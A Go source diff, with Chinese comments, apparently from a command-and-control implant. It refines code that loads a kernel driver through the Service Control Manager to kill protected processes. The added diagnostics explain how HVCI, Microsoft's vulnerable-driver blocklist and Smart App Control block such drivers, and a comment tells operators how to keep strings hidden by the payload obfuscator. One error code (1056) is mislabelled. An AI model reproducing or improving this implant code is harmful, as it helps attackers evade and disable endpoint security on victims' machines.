@@ -10,6 +10,7 @@ import (
 	"os"
 	"path/filepath"
 	"strings"
+	"syscall"
 	"time"
 	"unsafe"
 
@@ -274,6 +275,11 @@ func handlePPLKill(taskData string) (string, int32, string) {
 
 // ─── SCM 驱动服务 ────────────────────────────────────────────────
 
+// 注意：本文件内所有面向操作员的诊断文案都必须写成**不含转义符的简单双引号
+// 字面量**（用 " + " 拼接代替 \n），否则植入端字符串混淆器会跳过它们，把
+// "ERROR_ACCESS_DISABLED_BY_POLICY"/"HVCI" 等字样明文留在载荷里（见
+// internal/server/builder/implant_obfuscate.go：含转义的字符串不参与混淆）。
+
 func startKernelService(name, binPath string) error {
 	procOpenSCManagerW := resolveAPI("advapi32.dll", "OpenSCManagerW")
 	procCreateServiceW := resolveAPI("advapi32.dll", "CreateServiceW")
@@ -281,33 +287,73 @@ func startKernelService(name, binPath string) error {
 	procStartServiceW := resolveAPI("advapi32.dll", "StartServiceW")
 	procCloseServiceHandle := resolveAPI("advapi32.dll", "CloseServiceHandle")
 
-	hSCM, _, _ := procOpenSCManagerW.Call(0, 0, 0xF003F /*SC_MANAGER_ALL_ACCESS*/)
+	hSCM, _, scmErr := procOpenSCManagerW.Call(0, 0, 0xF003F /*SC_MANAGER_ALL_ACCESS*/)
 	if hSCM == 0 {
-		return errors.New("OpenSCManagerW failed (需要管理员权限)")
+		return errors.New("打开服务控制管理器失败：" + winErrText(scmErr) +
+			"；该操作需要管理员权限与高完整性级别，请先提权后再试")
 	}
 	defer procCloseServiceHandle.Call(hSCM)
 
 	sn, _ := windows.UTF16PtrFromString(name)
 	bp, _ := windows.UTF16PtrFromString(binPath)
-	hSvc, _, _ := procCreateServiceW.Call(
+	hSvc, _, createErr := procCreateServiceW.Call(
 		hSCM, uintptr(unsafe.Pointer(sn)), uintptr(unsafe.Pointer(sn)),
 		0xF01FF /*SERVICE_ALL_ACCESS*/, 0x1, /*SERVICE_KERNEL_DRIVER*/
 		0x3 /*SERVICE_DEMAND_START*/, 0x1, /*SERVICE_ERROR_NORMAL*/
 		uintptr(unsafe.Pointer(bp)), 0, 0, 0, 0, 0)
 	if hSvc == 0 {
-		// 服务已存在：尝试打开
-		hSvc, _, _ = procOpenServiceW.Call(hSCM, uintptr(unsafe.Pointer(sn)), 0xF01FF)
+		// 服务已存在：尝试打开（1056/1073 = ERROR_SERVICE_EXISTS）
+		hSvc, _, openErr := procOpenServiceW.Call(hSCM, uintptr(unsafe.Pointer(sn)), 0xF01FF)
 		if hSvc == 0 {
-			return errors.New("CreateServiceW/OpenServiceW failed")
+			return errors.New("创建或打开驱动服务失败：" + winErrText(createErr) + " / " + winErrText(openErr) +
+				"；服务名 " + name + "，驱动路径 " + binPath +
+				"（权限不足、驱动文件不可读、或同名服务已被占用都会走到这里）")
 		}
 	}
 	defer procCloseServiceHandle.Call(hSvc)
 
-	r1, _, _ := procStartServiceW.Call(hSvc, 0, 0)
+	r1, _, startErr := procStartServiceW.Call(hSvc, 0, 0)
 	if r1 == 0 {
-		return errors.New("StartServiceW failed（驱动可能被 HVCI/黑名单拦截）")
+		// 具体 Win32 错误码决定排查方向，必须原样给出（此前只报"可能被 HVCI/黑名单拦截"，无从定位）。
+		// 提示：1275 这类内核代码完整性拦截是**静默拒绝**，不会有任何杀软弹窗。
+		return errors.New("启动驱动服务失败：" + winErrText(startErr) +
+			"；排查：1275 = 被内核代码完整性策略拦截（HVCI 内存完整性 / 微软易受攻击驱动黑名单 / Smart App Control），" +
+			"此类拦截无弹窗、属内核静默拒绝；577 = 驱动签名证书已被吊销；2 = 驱动文件未成功落盘；" +
+			"5 = 权限不足；1053 = 驱动加载即崩溃（多为版本不匹配）；1058 = 服务被禁用；1073 = 服务已存在")
 	}
 	return nil
+}
+
+// winErrText 把 syscall.Errno 转成 "描述 (Win32 码 N)"，便于直接定位失败原因。
+func winErrText(err error) string {
+	if err == nil {
+		return "无错误信息"
+	}
+	var errno syscall.Errno
+	if errors.As(err, &errno) {
+		switch errno {
+		case 2:
+			return "ERROR_FILE_NOT_FOUND：找不到驱动文件 (2)"
+		case 5:
+			return "ERROR_ACCESS_DENIED：权限不足 (5)"
+		case 127:
+			return "ERROR_PROC_NOT_FOUND：API 解析失败 (127)"
+		case 577:
+			return "ERROR_IMAGE_CERT_REVOKED：驱动签名证书已被吊销 (577)"
+		case 1053:
+			return "ERROR_SERVICE_REQUEST_TIMEOUT：服务启动超时（驱动加载即崩溃）(1053)"
+		case 1056:
+			return "ERROR_SERVICE_EXISTS：同名服务已存在 (1056)"
+		case 1058:
+			return "ERROR_SERVICE_DISABLED：服务被禁用 (1058)"
+		case 1073:
+			return "ERROR_SERVICE_EXISTS：同名服务已存在 (1073)"
+		case 1275:
+			return "ERROR_ACCESS_DISABLED_BY_POLICY：被策略或黑名单拦截（HVCI 内存完整性 / 微软易受攻击驱动黑名单 / Smart App Control）(1275)"
+		}
+		return fmt.Sprintf("Win32 错误 %d", uintptr(errno))
+	}
+	return err.Error()
 }
 
 func stopKernelService(name string) error {
